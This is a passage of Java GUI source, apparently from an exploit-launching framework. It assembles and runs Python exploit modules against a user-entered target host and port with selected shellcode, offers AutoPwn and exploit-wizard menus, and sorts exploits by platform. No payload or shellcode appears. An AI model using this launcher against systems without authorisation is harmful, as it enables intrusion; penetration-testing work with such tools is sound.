                    runModule = pythonpath + " " + Paths.get(".").toAbsolutePath().normalize().toString() + "/exploits/code/" + exploit.getCodeName() + " " + jTextFieldTargetH.getText() + " " + jTextFieldTargetP.getText() + " " + ShellcodeSelected;
                }
                // Set exec options for clientside
                if (exploit.getType().equals("clientside")) {
                    runModule = pythonpath + " " + Paths.get(".").toAbsolutePath().normalize().toString() + "/exploits/code/" + exploit.getCodeName();
                    // Add location information to ShellcodeConsole
                    jTextAreaShellcode
                            .append("New client-side exploit file created\n");
                    jTextAreaShellcode
                            .append("Files are usually alocated at path: exploits/code/output/\n");

                }
                // Set exec options for local
                if (exploit.getType().equals("local")) {
                    runModule = pythonpath + " " + Paths.get(".").toAbsolutePath().normalize().toString() + "/exploits/code/" + exploit.getCodeName();
                }

                jTextAreaDebugging.append((runModule + "\n"));

                final Thread exploitThread;
                exploitThread = new Thread("exploitThread") {
                    @Override
                    public void run() {
                        try {
                            String line;
                            OutputStream stdin = null;
                            InputStream stderr = null;
                            InputStream stdout = null;

                            // launch EXE and grab stdin/stdout and stderr
                            Process process = Runtime.getRuntime().exec(runModule);
                            stdin = process.getOutputStream();
                            stderr = process.getErrorStream();
                            stdout = process.getInputStream();

                            // "write" the parms into stdin
                            //stdin.write(line.getBytes());
                            stdin.flush();
                            stdin.close();

                            // Obtain local time
                            Format formatter;
                            Date date = new Date();
                            formatter = new SimpleDateFormat("HH:mm:ss");
                            LogTime = formatter.format(date);
                            jTextAreaShellcode.append("[" + LogTime + "]" + " Your exploit: " + exploit.getModuleName() + " has been executed.\n");
                            jTextAreaShellcode.append("[" + LogTime + "]" + " Output messages from your exploit:\n");
                            // clean up if any output in stdout
                            BufferedReader brCleanUp
                                    = new BufferedReader(new InputStreamReader(stdout));
                            while ((line = brCleanUp.readLine()) != null) {
                                jTextAreaShellcode.append(line + "\n");
                            }
                            brCleanUp.close();

                            // clean up if any output in stderr
                            brCleanUp
                                    = new BufferedReader(new InputStreamReader(stderr));
                            while ((line = brCleanUp.readLine()) != null) {
                                jTextAreaShellcode.append(line + "\n");
                            }

                            brCleanUp.close();

                            // Leave the execution to Python!
                            // ProcessBuilder pb = new ProcessBuilder("python", "run.py");
                            //Process p = pb.start();
                            //p.waitFor();
                            //if (!p.isAlive()) {
                            //   File f = new File("run.py");
                            //    f.delete();
                            // }
                            DefaultTreeModel modelStatus = (DefaultTreeModel) jTreeModuleStatus.getModel();
                            DefaultMutableTreeNode rootStatus = (DefaultMutableTreeNode) modelStatus.getChild(modelStatus.getRoot(), 0);
                            rootStatus.add(new DefaultMutableTreeNode(exploit.getCodeName()));
                            jTreeModuleStatus.expandRow(0);
                            modelStatus.reload(rootStatus);

                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                };
                jProgressBarModuleStatus.setValue(100);
                exploitThread.start();
                try {
                    EPLogger.log("EXPLOIT NAME: " + exploit.getModuleName());
                    EPLogger.log("EXPLOIT TYPE: " + exploit.getType());
                    EPLogger.log("EXPLOIT PLATFORM: " + exploit.getPlatform());
                    EPLogger.log("EXPLOIT DESCRIPTION: " + exploit.getInformation().replaceAll("[\n\r]", ""));

                } catch (Exception e) {
                    Logger.getLogger(MainFrame.class
                            .getName()).log(Level.INFO, null, e);

                }
            }
        } catch (UnsupportedAudioFileException | IOException | LineUnavailableException ex) {
            Logger.getLogger(MainFrame.class
                    .getName()).log(Level.SEVERE, null, ex);
        }
    }//GEN-LAST:event_jButtonExecutionActionPerformed

    private void jMenuItem14ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem14ActionPerformed
        // TODO add your handling code here:
        Preferences.main(null);
    }//GEN-LAST:event_jMenuItem14ActionPerformed

    private void jMenuItem13ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem13ActionPerformed
        // TODO add your handling code here:
        AutoPwn.main(null);
    }//GEN-LAST:event_jMenuItem13ActionPerformed

    private void formWindowClosed(java.awt.event.WindowEvent evt) {//GEN-FIRST:event_formWindowClosed
        // TODO add your handling code here:
        System.exit(0);
    }//GEN-LAST:event_formWindowClosed

    private void jButton21ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton21ActionPerformed
        // TODO add your handling code here:
        Notepad.main(null);
    }//GEN-LAST:event_jButton21ActionPerformed

    private void jMenuItem48ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem48ActionPerformed
        // TODO add your handling code here:
        ExploitWizard.main(null);
    }//GEN-LAST:event_jMenuItem48ActionPerformed

    private void jButton3ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton3ActionPerformed
        try {

            String filename = "";

            JFileChooser fileChooser = new JFileChooser(new File(filename));
            fileChooser.showSaveDialog(this);
            // Read file
            FileReader fstream = new FileReader(fileChooser.getSelectedFile().toString());
            BufferedReader in = new BufferedReader(fstream);
            String stringToAppend;
            while ((stringToAppend = in.readLine()) != null) {
                if (stringToAppend.contains("Project name:")) {
                    jTextFieldProjectN.setText(stringToAppend.replace("Project name:", "").trim());
                }
                if (stringToAppend.contains("Target IP/URL:")) {
                    jTextFieldTargetH.setText(stringToAppend.replace("Target IP/URL:", "").trim());
                }
            }
            // Close the output stream
            in.close();

        } catch (IOException ex) {
            Logger.getLogger(MainFrame.class
                    .getName()).log(Level.SEVERE, null, ex);
        }
    }//GEN-LAST:event_jButton3ActionPerformed

    private void jMenuItem3ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem3ActionPerformed
        // TODO add your handling code here:
        String filename = "";
        // TODO add your handling code here:
        JFileChooser fileChooser = new JFileChooser(new File(filename));
        fileChooser.showSaveDialog(this);
        //jTextFieldPythonPath.setText(fileChooser.getSelectedFile().toString());
    }//GEN-LAST:event_jMenuItem3ActionPerformed

    private void jMenuItem12ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem12ActionPerformed
        String path = "exploits/";
        String files;
        File folder = new File(path);
        File[] listOfFiles = folder.listFiles();
        jTextAreaQuickInfo.append("[" + LogTime + "] "
                + "Modules successfully reloaded: OK" + "\n");
        DefaultTreeCellRenderer rendererModules = new DefaultTreeCellRenderer();
        rendererModules.setClosedIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/application.png"))));
        rendererModules.setOpenIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/application.png"))));
        rendererModules.setLeafIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/log.png"))));
        jTreeModuleStatus.setCellRenderer(rendererModules);
        DefaultTreeCellRenderer rendererExploits = new DefaultTreeCellRenderer();
        rendererExploits.setClosedIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/foldernormal.png"))));
        rendererExploits.setOpenIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/foldernormal2.png"))));
        rendererExploits.setLeafIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/scriptnormal.png"))));
        jTreeExploits.setCellRenderer(rendererExploits);
        DefaultTreeCellRenderer rendererRAT = new DefaultTreeCellRenderer();
        rendererRAT.setClosedIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/world.png"))));
        rendererRAT.setOpenIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/world.png"))));
        rendererRAT.setLeafIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/terminal.png"))));
        jTreeRAT.setCellRenderer(rendererRAT);
        DefaultTreeCellRenderer rendererScanner = new DefaultTreeCellRenderer();
        rendererScanner.setClosedIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/networking.png"))));
        rendererScanner.setOpenIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/networking.png"))));
        rendererScanner.setLeafIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/port.png"))));
        jTreeRemoteScanner.setCellRenderer(rendererScanner);
        DefaultTreeCellRenderer rendererTools = new DefaultTreeCellRenderer();
        rendererTools.setClosedIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/foldernormal.png"))));
        rendererTools.setOpenIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/foldernormal2.png"))));
        rendererTools.setLeafIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/tool.png"))));
        jTreeTools.setCellRenderer(rendererTools);
        DefaultTreeCellRenderer rendererNotepad = new DefaultTreeCellRenderer();
        rendererNotepad.setClosedIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/foldernormal.png"))));
        rendererNotepad.setOpenIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/foldernormal2.png"))));
        rendererNotepad.setLeafIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/server2.png"))));
        jTreeNotepad.setCellRenderer(rendererNotepad);

        // Iterate and add items
        DefaultTreeModel model = (DefaultTreeModel) jTreeExploits.getModel();
        DefaultTreeModel modelNotepad = (DefaultTreeModel) jTreeNotepad.getModel();
        DefaultTreeModel modelTools = (DefaultTreeModel) jTreeTools.getModel();

        for (int e = 0; e < 59; e++) {
            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), e);
            root.removeAllChildren();
        }
        for (int e1 = 0; e1 < 1; e1++) {
            DefaultMutableTreeNode root1 = (DefaultMutableTreeNode) modelNotepad.getChild(modelNotepad.getRoot(), e1);
            root1.removeAllChildren();
        }
        for (int e2 = 0; e2 < 3; e2++) {
            DefaultMutableTreeNode root2 = (DefaultMutableTreeNode) modelTools.getChild(modelTools.getRoot(), e2);
            root2.removeAllChildren();
        }

        for (int i = 0; i < listOfFiles.length; i++) {
            if (listOfFiles[i].isFile()) {
                files = listOfFiles[i].getName();
                if (files.endsWith(".xml") || files.endsWith(".XML")) {
                    // Instancio XMLTreenode
                    NewXMLNode = new XMLTreenode();
                    // Start de la clase main de XMLTreenode
                    NewXMLNode.main(null, files);

                    // Targets Tree
                    if (NewXMLNode.ExploitType.equals("notepad")) {
                        DefaultMutableTreeNode item = null;
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) modelNotepad.getChild(modelNotepad.getRoot(), 0);
                        if (NewXMLNode.Platform.equals("windows")) {
                            if (NewXMLNode.SpecialArgs.equals("owned")) {
                                item = new DefaultMutableTreeNode(NewXMLNode.ExploitName);
                            } else {
                                item = new DefaultMutableTreeNode(NewXMLNode.ExploitName);
                            }
                        }
                        if (NewXMLNode.Platform.equals("linux")) {
                            if (NewXMLNode.SpecialArgs.equals("owned")) {
                                item = new DefaultMutableTreeNode(NewXMLNode.ExploitName);
                            } else {
                                item = new DefaultMutableTreeNode(NewXMLNode.ExploitName);
                            }
                        }
                        if (NewXMLNode.Platform.equals("osx")) {
                            if (NewXMLNode.SpecialArgs.equals("owned")) {
                                item = new DefaultMutableTreeNode(NewXMLNode.ExploitName);
                            } else {
                                item = new DefaultMutableTreeNode(NewXMLNode.ExploitName);
                            }
                        }
                        if (NewXMLNode.Platform.equals("bsd")) {
                            if (NewXMLNode.SpecialArgs.equals("owned")) {
                                item = new DefaultMutableTreeNode(NewXMLNode.ExploitName);
                            } else {
                                item = new DefaultMutableTreeNode(NewXMLNode.ExploitName);
                            }
                        }
                        if (NewXMLNode.Platform.equals("mobile")) {
                            if (NewXMLNode.SpecialArgs.equals("owned")) {
                                item = new DefaultMutableTreeNode(NewXMLNode.ExploitName);
                            } else {
                                item = new DefaultMutableTreeNode(NewXMLNode.ExploitName);
                            }
                        }
                        root.add(item);
                        modelNotepad.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) modelNotepad.getChild(modelNotepad.getRoot(), 0);
                        if (root.getChildCount() == 0) {
                            // root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }

                    if (NewXMLNode.Platform.equals("tools")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) modelTools.getChild(modelTools.getRoot(), 0);
                        DefaultMutableTreeNode item = new DefaultMutableTreeNode(NewXMLNode.ExploitName);
                        root.add(item);
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) modelTools.getChild(modelTools.getRoot(), 0);
                        if (root.getChildCount() == 0) {
                            //root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("dos")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) modelTools.getChild(modelTools.getRoot(), 1);
                        DefaultMutableTreeNode item = new DefaultMutableTreeNode(NewXMLNode.ExploitName);
                        root.add(item);
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) modelTools.getChild(modelTools.getRoot(), 1);
                        if (root.getChildCount() == 0) {
                            //root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("others")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) modelTools.getChild(modelTools.getRoot(), 2);
                        DefaultMutableTreeNode item = new DefaultMutableTreeNode(NewXMLNode.ExploitName);
                        root.add(item);
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) modelTools.getChild(modelTools.getRoot(), 2);
                        if (root.getChildCount() == 0) {
                            //root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }

                    if (NewXMLNode.Platform.equals("aix")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 1);
                        DefaultMutableTreeNode item = new DefaultMutableTreeNode(NewXMLNode.ExploitName);
                        root.add(item);
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 1);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("android")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 2);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 2);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("arm")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 3);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 3);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("asp")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 4);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 4);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("atheos")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 5);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 5);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("beos")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 6);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 6);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("bsd")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 7);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 7);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("bsd_ppc")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 8);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 8);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("bsd_x86")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 9);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 9);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("bsdi_x86")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 10);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 10);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("cfm")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 11);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 11);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("cgi")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 12);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 12);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("freebsd")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 13);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 13);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("freebsd_x86")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 14);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 14);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("freebsd_x86-64")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 15);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 15);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("generator")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 16);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 16);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("hardware")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 17);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 17);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("hp-ux")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 18);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 18);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("immunix")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 19);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 19);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("ios")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 20);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 20);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("irix")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 21);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 21);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("java")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 22);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 22);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("jsp")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 23);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 23);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("lin_amd64")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 24);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 24);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("lin_x86")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 25);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 25);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("lin_x86-64")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 26);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 26);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("linux")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 27);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 27);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("linux_mips")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 28);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 28);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("linux_ppc")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 29);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 29);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("linux_sparc")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 30);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 30);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("minix")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 31);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 31);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("mips")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 32);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 32);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("multiple")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 33);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 33);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("netbsd_x86")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 34);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 34);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("netware")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 35);
                        root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                        model.reload(root);
                    } else {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 35);
                        if (root.getChildCount() == 0) {
                            root.add(new DefaultMutableTreeNode("Empty"));
                        }
                    }
                    if (NewXMLNode.Platform.equals("novell")) {
                        DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 36);
